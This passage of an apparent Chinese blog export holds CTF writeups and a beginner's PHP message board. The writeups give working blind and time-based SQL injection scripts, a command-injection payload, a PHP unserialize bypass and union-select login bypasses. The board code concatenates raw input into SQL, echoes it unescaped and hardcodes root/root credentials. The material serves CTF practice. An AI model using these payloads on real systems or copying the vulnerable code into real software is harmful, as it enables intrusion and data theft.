<span class="symbol">TimeoutError:</span></span><br><span class="line">            exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deluser</span><span class="params">(<span class="keyword">self</span>,num)</span></span><span class="symbol">:</span></span><br><span class="line">        cookies = &#123;<span class="string">'session'</span><span class="symbol">:self</span>.session&#125;</span><br><span class="line">        <span class="keyword">for</span> strs <span class="keyword">in</span> <span class="string">'flag&#123;&#125;0123456789bcde'</span><span class="symbol">:</span></span><br><span class="line">            payload = <span class="string">"111' and substr((select flag from flag),%d,1)=='%s"</span> % (num,strs)</span><br><span class="line">            data = &#123;<span class="string">'usernamedel'</span><span class="symbol">:payload</span>&#125;</span><br><span class="line">            <span class="symbol">try:</span></span><br><span class="line">                response = requests.post(url=<span class="keyword">self</span>.url,data=data,cookies=cookies)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'111'</span> <span class="keyword">not</span> <span class="keyword">in</span> response.<span class="symbol">text:</span></span><br><span class="line">                    <span class="keyword">self</span>.flag += strs</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">            except <span class="symbol">TimeoutError:</span></span><br><span class="line">                exit(-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">'__main__'</span><span class="symbol">:</span></span><br><span class="line">    exp = sqliexp()</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">39</span>,<span class="number">1</span>)<span class="symbol">:</span></span><br><span class="line">        exp.adduser()</span><br><span class="line">        exp.deluser(num)</span><br><span class="line">        print(exp.flag)</span><br></pre></td></tr></table></figure><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h2 id="中原工学院图书馆"><a href="#中原工学院图书馆" class="headerlink" title="中原工学院图书馆"></a>中原工学院图书馆</h2><p>看WP说这道题特别简单,用binwalk得到一个压缩包，发现一张图片。flag正确格式是drops{}，对图片中的密文进行rot13解密就拿到flag了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>初写留言板</title>
      <link href="/2018/12/23/%E5%88%9D%E5%86%99%E7%95%99%E8%A8%80%E6%9D%BF/"/>
      <url>/2018/12/23/%E5%88%9D%E5%86%99%E7%95%99%E8%A8%80%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<h2 id="第一次的留言板"><a href="#第一次的留言板" class="headerlink" title="第一次的留言板"></a>第一次的留言板</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一次写留言板,真的好辛苦,几分钟看懂的代码自己一个个敲花了一下午</span><br><span class="line">体会到开发的痛苦了,希望自己以后可以多写东西出来</span><br></pre></td></tr></table></figure><h2 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>留言板<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"list.php"</span>&gt;</span>浏览留言<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"Post"</span> <span class="attr">action</span>=<span class="string">"add.php"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span>&gt;</span>用户:<span class="tag">&lt;<span class="name">br</span>&gt;</span> <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">style</span>=<span class="string">"width=350px"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">标题:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"title"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">内容:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">"content"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">"发布留言"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="add-php"><a href="#add-php" class="headerlink" title="add.php"></a>add.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">header(<span class="string">"charset=utf8"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</span></span><br><span class="line"><span class="php">$user = $_POST[<span class="string">'user'</span>];</span></span><br><span class="line"><span class="php">$title = $_POST[<span class="string">'title'</span>];</span></span><br><span class="line"><span class="php">$content = $_POST[<span class="string">'content'</span>];</span></span><br><span class="line"><span class="php">var_dump($user.$title.$content);</span></span><br><span class="line"><span class="php">$sql = <span class="string">"insert into message (user,title,content) values ('$user','$title','$content')"</span>;</span></span><br><span class="line"><span class="php">$row = mysql_query($sql);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($row)&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('插入成功');window.history.go(-1);&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="conn-php"><a href="#conn-php" class="headerlink" title="conn.php"></a>conn.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span></span><br><span class="line"><span class="php">$host = <span class="string">'localhost'</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">'root'</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">'root'</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$conn = mysql_connect($host,$username,$password);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!$conn)&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">"连接失败"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">mysql_select_db(<span class="string">"bbs"</span>,$conn);</span></span><br><span class="line"><span class="php">mysql_query(<span class="string">"set names utf8"</span>);</span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="del-php"><a href="#del-php" class="headerlink" title="del.php"></a>del.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">header(<span class="string">"content-type:text/html,charset='utf-8'"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'list.php'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'conn.php'</span>);</span></span><br><span class="line"><span class="php">$id = $_GET[<span class="string">'id'</span>];</span></span><br><span class="line"><span class="php">$sql = <span class="string">"delete from message where id="</span>.$id;</span></span><br><span class="line"><span class="php">$result = mysql_query($sql);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($result)&#123;</span></span><br><span class="line"><span class="php"> <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('删除成功');window.location.href='list.php';&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php"> &#125;</span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="list-php"><a href="#list-php" class="headerlink" title="list.php"></a>list.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>留言查询<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"add.html"</span>&gt;</span>添加留言<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">align</span>=<span class="string">"center"</span> <span class="attr">border</span>=<span class="string">"1"</span> <span class="attr">width</span>=<span class="string">"50%"</span> <span class="attr">rules</span>=<span class="string">"all"</span> <span class="attr">bgcolor</span>=<span class="string">"#CCFF80"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>用户<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">"conn.php"</span>);</span></span><br><span class="line"><span class="php">$sql = <span class="string">"select * from message order by id desc"</span>;</span></span><br><span class="line"><span class="php">$query = mysql_query($sql);</span></span><br><span class="line"><span class="php"><span class="comment">//$row = mysql_fetch_array($query);</span></span></span><br><span class="line"><span class="php"><span class="comment">//echo $row['id'];</span></span></span><br><span class="line"><span class="php"><span class="comment">//var_dump($row);</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="keyword">while</span>($row=mysql_fetch_array($query))&#123;  <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"del.php?id=&lt;?php echo $row['id'];?&gt;"</span>&gt;</span>删除留言<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">'user'</span>]; <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">'title'</span>] <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">'content'</span>] <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="php"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>安恒杯12月月赛WP</title>
      <link href="/2018/12/23/%E5%AE%89%E6%81%92%E6%9D%AF12%E6%9C%88%E6%9C%88%E8%B5%9BWP/"/>
      <url>/2018/12/23/%E5%AE%89%E6%81%92%E6%9D%AF12%E6%9C%88%E6%9C%88%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><pre><code>这次的月赛可以说非常适合我这种菜鸡做了</code></pre><h2 id="ezweb2"><a href="#ezweb2" class="headerlink" title="ezweb2:"></a>ezweb2:</h2><p>请求包中发现一个user=base64</p><p>解码得到user,构造admin 然后base64提交</p><p>发现跳转到后台admin.php</p><p>试了一个ls发现有回显,应该是个命令执行漏洞</p><p>构造: cmd = ls$IFS/  成功回显</p><p>然后读取flag:  cmd = cat $IFS /ffLAG_404</p><h2 id="easy："><a href="#easy：" class="headerlink" title="easy："></a>easy：</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php">@error_reporting(<span class="number">1</span>); </span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (file_get_contents($filename))         </span></span><br><span class="line"><span class="php">            &#123;              </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> file_get_contents($filename); </span></span><br><span class="line"><span class="php">            &#125; </span></span><br><span class="line"><span class="php">        &#125;     </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span></span><br><span class="line"><span class="php">&#123; </span></span><br><span class="line"><span class="php">    $data = $_GET[<span class="string">'data'</span>];</span></span><br><span class="line"><span class="php">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(count($matches))</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $good = unserialize($data);</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $good;</span></span><br><span class="line"><span class="php">    &#125;     </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="keyword">else</span> </span></span><br><span class="line"><span class="php">&#123; </span></span><br><span class="line"><span class="php">    highlight_file(<span class="string">"./index.php"</span>); </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>本地构造序列化<br>O:4:”baby”:1:{s:4:”file”;s:8:”flag.php”;}</p><p>因为存在过滤出语句<br>preg_match(‘/[oc]:\d+:/i’,$data,$matches);</p><p>所以需要绕过,用加号进行绕过:<br>O:+4:”baby”:1:{s:4:”file”;s:8:”flag.php”;}</p><p>但如果直接传值的话会，服务器接收到会把加号认为空格，所以要对加号url编码：<br>O:%2b4:”baby”:1:{s:4:”file”;s:8:”flag.php”;}</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h2 id="JUJU"><a href="#JUJU" class="headerlink" title="JUJU"></a>JUJU</h2><p> 提示女朋友问我这11只JUJU哪只好看？<br> 图片里没有11只JUJU，用windex改个高度即可<br>然后base32解码得到flag</p><h2 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h2><p>zip加密，一般zip加密只有那几种，并且打开zip文件里面还有一个已经给出的txt文件，还有一个经过加密的zip文件，很明显是明文攻击就可以了<br>将txt文件加密为zip文件,然后用ARCHPR进行明文攻击<br>得到一个doc文件打开,得到一个5 3 的图片，把图片移开就可以看到flag了</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTF实验吧writeup</title>
      <link href="/2018/12/21/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7writeup/"/>
      <url>/2018/12/21/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="实验吧writeup"><a href="#实验吧writeup" class="headerlink" title="实验吧writeup"></a>实验吧writeup</h2><ul><li>看起来有点难分值</li></ul><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考察点:<span class="built_in">sleep</span>()时间盲注</span><br></pre></td></tr></table></figure><p>selete被过滤了,利用slepp()进行时间盲注.关键payload:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin' <span class="keyword">and</span> <span class="keyword">case</span> <span class="keyword">when</span>(substr(password,<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'i'</span>) <span class="keyword">then</span> sleep(<span class="number">18</span>) <span class="keyword">else</span> sleep(<span class="number">0</span>) <span class="keyword">end</span> <span class="keyword">and</span> '<span class="string">'='</span>&amp;pass=<span class="number">9</span>&amp;action=login</span><br></pre></td></tr></table></figure><p>脚本如下:</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin' <span class="keyword">and</span> case when(substr(password,<span class="number">1</span>,<span class="number">1</span>)='i') <span class="keyword">then</span> sleep(<span class="number">8</span>) <span class="keyword">else</span> sleep(<span class="number">0</span>) end <span class="keyword">and</span> ''='&amp;pass=&amp;action=login</span><br><span class="line">import requests</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line">guess = <span class="string">"1234567890-_=+qwertyuioplkjhgfdsazxcvbnm?!@#$%^&amp;*"</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/basic/inject/index.php"</span></span><br><span class="line"></span><br><span class="line">flag1 = ''</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> guess:</span><br><span class="line">flag = <span class="string">"admin' and case when(substr(password,%s,1)='%s') then sleep(8) else sleep(0) end and ''='&amp;pass=&amp;action=login"</span><span class="symbol">%</span>(i,j)</span><br><span class="line"></span><br><span class="line">data = &#123;'admin':<span class="string">"flag"</span>&#125;</span><br><span class="line"></span><br><span class="line">timestart = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line"></span><br><span class="line">r = requests.<span class="built_in">get</span>(url,params=flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">time</span>.<span class="built_in">time</span>() - timestart &gt; <span class="number">10</span>:</span><br><span class="line">flag1 = flag1 + j</span><br><span class="line"><span class="built_in">print</span>(j)</span><br><span class="line"><span class="built_in">break</span></span><br></pre></td></tr></table></figure><ul><li>猫抓老鼠</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在返回报看到<span class="symbol">:Content-Row</span>: MTU0NTIyNzcyNg==</span><br><span class="line">直接提交即可,不用解密</span><br></pre></td></tr></table></figure><ul><li>头有点大分值</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点<span class="selector-pseudo">:HTTP</span>头</span><br></pre></td></tr></table></figure><ul><li>貌似有点难分值</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点<span class="selector-pseudo">:HTTP</span>头,<span class="selector-tag">XXF</span></span><br></pre></td></tr></table></figure><ul><li>这个看起来有点简单!</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点<span class="selector-pseudo">:SQL</span>注入,</span><br></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用 <span class="class"><span class="keyword">union</span> 进行注入,没有过滤任何字符</span></span><br></pre></td></tr></table></figure><ul><li>PHP大法分值</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">考点<span class="symbol">:php</span>代码审计</span><br><span class="line">试了eregi()弱类型,发现不行</span><br><span class="line">看到<span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]); 尝试二次url编码,成功绕过</span><br></pre></td></tr></table></figure><ul><li>what a fuck!这是什么鬼东西?</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">考点<span class="selector-pseudo">:JSfack</span></span><br><span class="line">全选复制,在浏览器的运行台运行即可</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">考点: php审计 + sql注入</span><br><span class="line">在源码中看到index.txt</span><br><span class="line">关键代码:</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select pw from php where user='<span class="variable">$user</span>'"</span>;</span><br><span class="line"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$query</span>, MYSQL_ASSOC);</span><br><span class="line">//<span class="built_in">echo</span> <span class="variable">$row</span>[<span class="string">"pw"</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ((<span class="variable">$row</span>[pw]) &amp;&amp; (!strcasecmp(<span class="variable">$pass</span>, <span class="variable">$row</span>[pw]))) &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;"</span>;</span><br><span class="line">这里取一条结果集进行验证,可使用union select 构造一条结果集来绕过</span><br><span class="line">payload:</span><br><span class="line">1<span class="string">'union select md5(1) #</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">不理解可以自己搭建环境试试</span></span><br></pre></td></tr></table></figure><ul><li>NSCTF web200</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 